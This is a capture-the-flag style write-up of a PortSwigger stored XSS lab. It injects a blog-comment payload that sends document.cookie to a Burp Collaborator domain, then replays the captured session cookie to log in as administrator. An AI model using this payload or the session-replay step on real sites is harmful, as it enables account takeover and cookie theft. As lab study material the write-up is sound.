## Lab Description :


![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/2111f083-5fc7-4a9e-be03-80e7a41c76eb)


## Solution :

From what I read on the lab’s description, the vulnerability is in the blog comments function. So, let’s take a look at the comment function.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a8715b70-04e9-4e01-920a-89522c4d1178)

Let’s check if either of them is vulnerable to XSS by using a simple payload:

> javascript code to make HTTP request to external domain.

>  javascript has methods and API to make HTTP requests.

 So the payload will be
 
 ```js
<img src=x onerror=this.src='http://domain/?'+document.cookie;>
```

we willl use `burp collaborator` to generate a domain name for us then we that domain name in our xss payload.

Go to burp  collaborator window and copy the  collaborator payload ie our domain.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/52294b9c-f23d-4228-a3b8-38960fcca153)

Then go and press `poll now` collaborator.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b953e58a-fbcb-43c4-aa20-cc19dc70bf03)

As we see there are a few http interactions i choose any one of the http requests and click on `request to collaborator` tab.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6f368385-5ef2-46c3-bf94-946f10dbcfb7)

Looking at the get request we see a `url` parameter called `session` and its value  is the session cookie of the victim user which was captured and sent to the burp collaborator by our xss payload.

session cookie value=`W6HvkaYQcVhLZ45KZ93P8oZSL0OEqd9g`

Lets copy the session value and and go to the web browser and turn on `burop intercept` and then click on my account.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4d68af5c-a725-4f15-a610-a3020229b658)

change the coookie value with session cookie value what we have.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/811e931e-fb8b-4c44-a662-5893660bf6af)

Now we can see the web application saying that your `username is:administrator`

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/3c2eb2e2-9340-46f5-831f-f077fb597377)

Lab solved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/8e0313d0-2257-4705-a407-d051e4b9476e)





